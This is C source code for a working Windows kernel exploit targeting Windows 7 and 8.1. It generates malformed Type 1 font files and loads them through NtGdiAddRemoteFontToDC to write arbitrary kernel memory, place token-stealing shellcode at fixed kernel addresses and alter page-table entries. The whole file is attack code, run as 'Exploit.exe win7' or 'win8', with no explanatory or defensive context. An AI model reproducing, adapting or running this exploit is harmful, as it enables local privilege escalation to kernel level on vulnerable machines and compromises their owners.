
#include <stdlib.h>
#include <stdio.h>
#include <STDARG.H>
#include <stddef.h>
#include <windows.h>
#include <Shellapi.h>
#include <VersionHelpers.h>
#include "def.h"

extern unsigned char pfmData[684];
extern unsigned char payloadData3[3568];

BOOL g_bWin7 = TRUE;

double __fastcall sub_700E090(unsigned int a1, char a2, char a3)
{
	int v3; // er11
	signed int v4; // er9

	v3 = 1 << (a2 - 1);
	v4 = ((1 << a2) - 1) & (a1 >> a3);
	if ((v3 & v4) != 0)
		v4 = -1 - (~v4 & (v3 - 1));
	return (double)(int)(a1 & ((1 << a3) - 1)) / (double)(1 << a3) + (double)v4;
}


__int64 __fastcall generatePFB_(unsigned int a1, unsigned int a2, unsigned int a3, char** a4, DWORD* a5)
{
	char* font_buffer = NULL;
	char* font_buffer_end = NULL;

	font_buffer = new char[204800i64];
	font_buffer_end = font_buffer + 204800;

	char* p = font_buffer;
	p += snprintf(p, 204800i64, "%s", "%!FontType1-1.0: Symbol 001.008\r");
	p += snprintf(p, font_buffer_end - p, "%s", "11 dict begin\r");

	
	p += snprintf(p, font_buffer_end - p, "%s", "/WeightVector [");

	double v15 = sub_700E090(0x41414141u, 16, 16);

	for (int i = 0; i < 10; i++)
	{
		p += snprintf(p, font_buffer_end - p, " %0.6f ", v15);
	}

	p += snprintf(p, font_buffer_end - p, "%s", "]\r");
	

	p += snprintf(p, font_buffer_end - p, "%s", "/Private begin\r");
	p += snprintf(p, font_buffer_end - p, "%s", "/Blend begin\r");


	short v21 = HIWORD(a3);
	if (v21 < 0 )
		v21 = -1 - (~HIWORD(a3) & 0x7FFF);
	short v23 = HIWORD(a1);
	if (v23 < 0)
		v23 = -1 - (~HIWORD(a1) & 0x7FFF);
	short v24 = HIWORD(a2);
	if (v24 < 0)
		v24 = -1 - (~HIWORD(a2) & 0x7FFF);
	p += snprintf(
		p,
		font_buffer_end - p,
		"/VToHOrigin[[ %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f %0.6f ]]\r",
		(double)(unsigned __int16)a2 * 0.0000152587890625 + (double)v24,
		(double)(unsigned __int16)a1 * 0.0000152587890625 + (double)v23,
		-1.0,
		0.4999847412109375,
		(double)(unsigned __int16)a3 * 0.0000152587890625 + (double)v21,
		0.5,
		-1.0,
		0.4999847412109375,
		-0.9999847412109375,
		0.4999847412109375);

	memset(p, 'C', 32);
	p += 32;
	p += snprintf(p, font_buffer_end - p, "%s", "currentdict end\r");
	p += snprintf(p, font_buffer_end - p, "%s", "currentfile ");

	int v37;
	v37 = ((p - font_buffer) << 16) + 0x180;

	char* v27 = new char[100];
	char* tmp = v27;
	tmp += snprintf(tmp, font_buffer_end - p, "%s", "eexec\r");
	memset(tmp, 'D', 32);
	tmp += 32;

	char* ret_buffer = new char[font_buffer_end - p + tmp - v27 + 20];
	memset(ret_buffer, 0, font_buffer_end - p + tmp - v27 + 20);
	char* ret_p = ret_buffer;
	if (ret_buffer)
	{
		*(int*)ret_p = v37;
		ret_p += 4;
		*(short*)ret_p = (p - font_buffer) >>16;
		ret_p += 2;
		memcpy(ret_p, font_buffer, p - font_buffer);
		ret_p += p - font_buffer;
		memcpy(ret_p, v27,  tmp - v27);
		ret_p += tmp - v27;
		memcpy(ret_p, "cleartomark", 11);
	}
	else
	{
		return -1;
	}

	*a5 = p - font_buffer + tmp - v27 + 20;
	*a4 = ret_buffer;

	if (font_buffer)
	{
		delete[]font_buffer;
	}

	if (v27)
	{
		delete[]v27;
	}

	return 0i64;
}

__int32 __fastcall generatePFB2_(unsigned int version__, char** buffer, DWORD* size)
{
	int v77 = 18;
	if (version__ == 1)
	{
		v77 = 19;
	}

	char* font_buffer = NULL;
	char* font_buffer_end = NULL;

	font_buffer = new char[204800i64];
	font_buffer_end = font_buffer + 204800;

	char* p = font_buffer;
	p += snprintf(p, 204800i64, "%s", "%!FontType1-1.0: Symbol 001.008\r");
	p += snprintf(p, font_buffer_end - p, "%s", "11 dict begin\r");
	p += snprintf(p, font_buffer_end - p, "%s", "/BlendDesignPositions ");

	p += snprintf(p, font_buffer_end - p, "%s", "[");
	for (int i = 0; i < 16; i++)
	{
		p += snprintf(p, font_buffer_end - p, "%s", "[]");
	}
	p += snprintf(p, font_buffer_end - p, "%s", "]");
	p += snprintf(p, font_buffer_end - p, "%s", "\r");
	//p += snprintf(p, font_buffer_end - p, "%s", "/Blend begin");
	//p += snprintf(p, font_buffer_end - p, "%s", "\r");


	p += snprintf(p, font_buffer_end - p, "%s", "/BlendDesignPositions [");
	for (int i = 0; i < v77; i++)
	{
		p += snprintf(p, font_buffer_end - p, "%s", "[]");
	}

	int v45 = 0xFFDF1000;
	int v46;
	if (version__ == 2)
		v46 = 10;
	else if (version__ == 1)
		v46 = 1;
	else v46 = 8;

	p += snprintf(p, font_buffer_end - p, "%s", "[");
	for (int i = 0; i < v46; i++)
	{
		short v47 = HIWORD(v45);
		if(v47 < 0)
			v47 = -1 - (~HIWORD(v45) & 0x7FFF);
		p += snprintf(p, font_buffer_end - p, " %0.6f ", (double)(unsigned __int16)v45++ * 0.0000152587890625 + (double)v47);
	}

	__int64 v81[2];
	if (version__ == 2)
	{
		printf("[+] 0xFFFFF78000000822ui64 OSVER_WIN_8_1\n");
		v81[0] = 0xFFFFF78000000822ui64;
		v81[1] = 0xFFFFF78000000834ui64;
	}
	else
	{
		printf("[+] 0xFFFFF9000000381Au \n");
		v81[0] = 0xFFFFF9000000381Aui64;
		v81[1] = 0xFFFFF90000003808ui64;
	}

	int* v49 = (int*)&v81;
	for (int i = 0; i < 4; i++)
	{
		short v52 = HIWORD(*v49);
		if (v52 < 0)
			v52 = -1 - (~HIWORD(*v49) & 0x7FFF);
		p += snprintf(p, font_buffer_end - p, " %0.6f ", (double)(unsigned __int16)(*v49) * 0.0000152587890625 + (double)v52);
		v49++;
	}

	p += snprintf(p, font_buffer_end - p, "%s", "]]\r");

	p += snprintf(p, font_buffer_end - p, "%s", "currentdict end\r");
	p += snprintf(p, font_buffer_end - p, "%s", "currentfile ");

	int v37;
	v37 = ((p - font_buffer) << 16) + 0x180;

	char* v27 = new char[100];
	char* tmp = v27;
	tmp += snprintf(tmp, font_buffer_end - p, "%s", "eexec\r");

	char* ret_buffer = new char[font_buffer_end - p + tmp - v27 + 20];
	memset(ret_buffer, 0, font_buffer_end - p + tmp - v27 + 20);
	char* ret_p = ret_buffer;
	if (ret_buffer)
	{
		*(int*)ret_p = v37;
		ret_p += 4;
		*(short*)ret_p = (p - font_buffer) >> 16;
		ret_p += 2;
		memcpy(ret_p, font_buffer, p - font_buffer);
		ret_p += p - font_buffer;
		memcpy(ret_p, v27, tmp - v27);
		ret_p += tmp - v27;
		memcpy(ret_p, "cleartomark", 11);
	}
	else
	{
		return -1;
	}

	*size = p - font_buffer + tmp - v27 + 20;
	*buffer = ret_buffer;

	if (font_buffer)
	{
		delete[]font_buffer;
	}

	if (v27)
	{
		delete[]v27;
	}

	return 0;
}

void NtGdiAddRemoteFontToDC_Wrapper(char *pfbData, int pfb_size)
{
	int nPfmSize = sizeof(pfmData);

	int nAlignPfmSize = (nPfmSize + 3) & 0xFFFFFFFC;
	int nAlignPfbSize = (pfb_size + 3) & 0xFFFFFFFC;

	PBYTE pBuffer = new BYTE[sizeof(TYPE1FONTHEADER) + nAlignPfmSize + nAlignPfbSize];
	PTYPE1FONTHEADER pType1FontHdr = (PTYPE1FONTHEADER)pBuffer;
	pType1FontHdr->IsType1Font = 1;
	pType1FontHdr->NumberOfFiles = 0;
	pType1FontHdr->Offsets[0] = nAlignPfmSize;
	pType1FontHdr->Offsets[1] = nAlignPfmSize + nAlignPfbSize;
	memcpy(pType1FontHdr->Data, pfmData, nPfmSize);
	memcpy(pType1FontHdr->Data + pType1FontHdr->Offsets[0], pfbData, pfb_size);

	HDC hdc = GetWindowDC(0);
	if(g_bWin7)
		NtGdiAddRemoteFontToDC_Win7(hdc, pType1FontHdr, sizeof(TYPE1FONTHEADER) + nAlignPfmSize + nAlignPfbSize, 0);
	else NtGdiAddRemoteFontToDC_Win8(hdc, pType1FontHdr, sizeof(TYPE1FONTHEADER) + nAlignPfmSize + nAlignPfbSize, 0);

	delete[]pBuffer;
}

void triggerBugWin7_()
{
	DWORD pfb_size = 0;
	char* pfbData = NULL;
	printf("[+] write shellcode at 0xFFFFF9000x381Au\n");

	BYTE* p = (BYTE*)ReplaceToken_Win8;

	int nCodeSize = 0;
	while (1)
	{
		if (*(DWORD*)((BYTE*)ReplaceToken_Win7 + nCodeSize) == 0x90909090) break;
		nCodeSize++;
	}

	nCodeSize += (4 - nCodeSize % 4);

	BYTE* pShellCode = new BYTE[nCodeSize];
	memcpy(pShellCode, ReplaceToken_Win7, nCodeSize);


	DWORD dwCurrentPID = GetCurrentProcessId();
	printf("PID = %#08x\n", dwCurrentPID);
	for (int i = 0; i < nCodeSize; i++)
	{
		if (*(DWORD*)(pShellCode + i) == 0xdeaddafe)
		{
			printf("[+] replace PID [%d(%#08x) at deaddafe]\n", dwCurrentPID, dwCurrentPID);

			*(DWORD*)(pShellCode + i) = dwCurrentPID;
		}
	}


	printf(" ShellCode[%#x]\n", nCodeSize);
	for (int i = 0; i < nCodeSize / 16; i++)
	{
		for (int j = 0; j < 16; j++)
		{
			printf("%02X ", *(pShellCode + i * 16 + j));
		}
		printf("\n");
	}

	for (int i = 0; i < nCodeSize % 16; i++)
	{
		printf("%02X ", *(pShellCode + (nCodeSize / 16) * 16 + i));
	}
	printf("\n");

	for (int i = 0; i < (nCodeSize >> 2); i++)
	{
		DWORD dwKernelCode = *(DWORD*)(pShellCode + 4i64 * i);

		if (generatePFB_(0xFFFFF900, 0x381Au + 4 * i, dwKernelCode, &pfbData, &pfb_size) || !pfbData)
		{
			printf(" [-] writting 0x5E37FF5Fu at shellcode is failed\n");
			if (pfbData) delete[]pfbData;
			return;
		}

		NtGdiAddRemoteFontToDC_Wrapper(pfbData, pfb_size);

		delete[]pfbData;
	}

	if (generatePFB2_(0, &pfbData, &pfb_size) || !pfbData)
	{
		printf(" [-] generatePFB2_ is failed\n");
		if (pfbData) delete[]pfbData;
		return;
	}

	//FILE* fp = fopen("D:\\3.txt", "w+");
	//fwrite(pfbData, pfb_size, 1, fp);
	//fclose(fp);

	NtGdiAddRemoteFontToDC_Wrapper(pfbData, pfb_size);

	delete[]pfbData;

	delete[]pShellCode;
}

void triggerBugWin8_1_()
{
	DWORD size1 = 0;
	char* PFB_set_E_in_pagetable = NULL;
	if (generatePFB_(0xFFFFF6FB, 0xC0000004, 0, &PFB_set_E_in_pagetable, &size1) || !PFB_set_E_in_pagetable)
	{
		printf(" [-] writting PFB_set_E_in_pagetable is failed\n");
		if (PFB_set_E_in_pagetable) delete[]PFB_set_E_in_pagetable;
		return;
	}

	DWORD size2 = 0;
	char* PFB_restore_E_in_pagetable = NULL;
	if (generatePFB_(0xFFFFF6FB, 0xC0000004, 0x80000000, &PFB_restore_E_in_pagetable, &size2) || !PFB_restore_E_in_pagetable)
	{
		printf(" [-] writting PFB_restore_E_in_pagetable is failed\n");
		if (PFB_restore_E_in_pagetable) delete[]PFB_restore_E_in_pagetable;
		return;
	}

	DWORD pfb_size = 0;
	char* pfbData = NULL;

	printf("[+] prepair shellcode\n");

	int nCodeSize = 0;
	while (1)
	{
		if (*(DWORD*)((BYTE*)ReplaceToken_Win8 + nCodeSize) == 0x90909090) break;
		nCodeSize++;
	}

	nCodeSize += (4 - nCodeSize % 4);

	BYTE* pShellCode = new BYTE[nCodeSize];
	memcpy(pShellCode, ReplaceToken_Win8, nCodeSize);


	DWORD dwCurrentPID = GetCurrentProcessId();
	printf("PID = %#08x\n", dwCurrentPID);
	for (int i = 0; i < nCodeSize; i++)
	{
		if (*(DWORD*)(pShellCode + i) == 0xdeaddafe)
		{
			printf("[+] replace PID [%d(%#08x) at deaddafe]\n", dwCurrentPID, dwCurrentPID);

			*(DWORD*)(pShellCode + i) = dwCurrentPID;
		}
	}

	printf(" ShellCode[%#x]\n", nCodeSize);
	for (int i = 0; i < nCodeSize / 16; i++)
	{
		for (int j = 0; j < 16; j++)
		{
			printf("%02X ", *(pShellCode + i * 16 + j));
		}
		printf("\n");
	}

	for (int i = 0; i < nCodeSize % 16; i++)
	{
		printf("%02X ", *(pShellCode + (nCodeSize / 16) * 16 + i));
	}
	printf("\n");

	printf("[+] write shellcode at 0xFFFFF78000000822\n");
	for (int i = 0; i < (nCodeSize >> 2); i++)
	{
		DWORD dwKernelCode = *(DWORD*)(pShellCode + 4i64 * i);

		if (generatePFB_(0xFFFFF780, 0x834 + 4 * i, dwKernelCode, &pfbData, &pfb_size) || !pfbData)
		{
			printf(" [-] writting 0x5E37FF5Fu at shellcode is failed\n");
			if (pfbData) delete[]pfbData;
			return;
		}

		NtGdiAddRemoteFontToDC_Wrapper(pfbData, pfb_size);

		delete[]pfbData;
	}

	printf("[+] prepair pfb2\n");
	DWORD size3 = 0;
	char* PFB_code_exec = NULL;
	if (generatePFB2_(2, &PFB_code_exec, &size3) || !PFB_code_exec)
	{
		printf(" [-] generatePFB2_ is failed\n");
		if (PFB_code_exec) delete[]PFB_code_exec;
		return;
	}

	printf("[+] call NtGdiAddRemoteFontToDC_Wrapper1\n");
	NtGdiAddRemoteFontToDC_Wrapper(PFB_set_E_in_pagetable, size1);


	printf("[+] call NtGdiAddRemoteFontToDC_Wrapper2\n");
	NtGdiAddRemoteFontToDC_Wrapper(PFB_code_exec, size3);
	

	printf("[+] call NtGdiAddRemoteFontToDC_Wrapper3\n");
	NtGdiAddRemoteFontToDC_Wrapper(PFB_restore_E_in_pagetable, size2);

	delete[]pShellCode;
}


int main(int argc, char** argv)
{
	if (argc == 2)
	{
		if (!strcmp(argv[1], "win7"))
		{
			printf("Target OS is Win7! \n");
			g_bWin7 = TRUE;
			triggerBugWin7_();
		}
		else if (!strcmp(argv[1], "win8"))
		{
			printf("Target OS is Win8.1! \n");
			g_bWin7 = FALSE;
			triggerBugWin8_1_();
		}
		else
		{
			printf("usage:\n");
			printf("Exploit.exe win7[or win8)\n");
			return 0;
		}
	}
	else
	{
		printf("usage:\n");
		printf("Exploit.exe win7[or win8)\n");
		return 0;
	}

	printf("- end -\n"); 
	
	while (1);
	
	return 0;
}
